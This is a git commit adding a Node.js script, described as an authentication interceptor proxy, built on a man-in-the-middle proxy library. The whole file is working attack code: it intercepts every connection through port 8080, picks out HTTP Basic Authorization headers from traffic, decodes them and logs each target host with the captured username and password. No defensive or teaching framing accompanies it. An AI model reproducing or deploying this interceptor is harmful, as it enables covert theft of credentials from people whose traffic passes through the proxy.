81d4346309a98c16de8a3551c78d864e612e2a08
Gerardo Junior <me@gerardo-junior.com>
2021-04-04 21:01:21 -0300

    Create a authenticaton interceptor proxy

---
+++ index.js
@@ -0,0 +1,57 @@
+const stream = require('stream')
+const MitmProxy = require('@pureproxy/mitmproxy')
+ 
+const server = new class extends MitmProxy {
+  wrapClientForObservableStreaming(client, { hostname, port, context }) {
+    // return a duplex stream (like sockets) to monitor all data in transit
+ 
+    return new class extends stream.Duplex {
+      constructor() {
+        super()
+ 
+        client.on('data', (data) => {
+          // log incoming data
+          this.push(data)
+        })
+      }
+ 
+      _write(data, encoding, callback) {
+        // log outgoing data
+        let payload = data.toString('utf8')
+        
+        payload.split('\n').forEach(content => {
+            if (content.startsWith('Authorization')) {
+                try {
+                    
+                    let basicAuth =  Buffer.from(content.replace('Authorization: Basic ', ''), 'base64').toString('utf8').split(':')
+                    
+                    let credential = { 
+                        target: client._host || client._parent._host,
+                        user: decodeURI(basicAuth[0]), 
+                        password: decodeURI(basicAuth[1]) 
+                    }
+                    
+                    console.log('I got a credential:', credential)
+
+                } catch (err) {
+                    console.error(err)
+                }
+                
+            }
+        })
+
+        client.write(data)
+ 
+        callback()
+      }
+ 
+      _read() {}
+    }
+  }
+ 
+  shouldIntercept(hostname, port, context) {
+    return true
+  }
+}
+ 
+server.listen(8080)
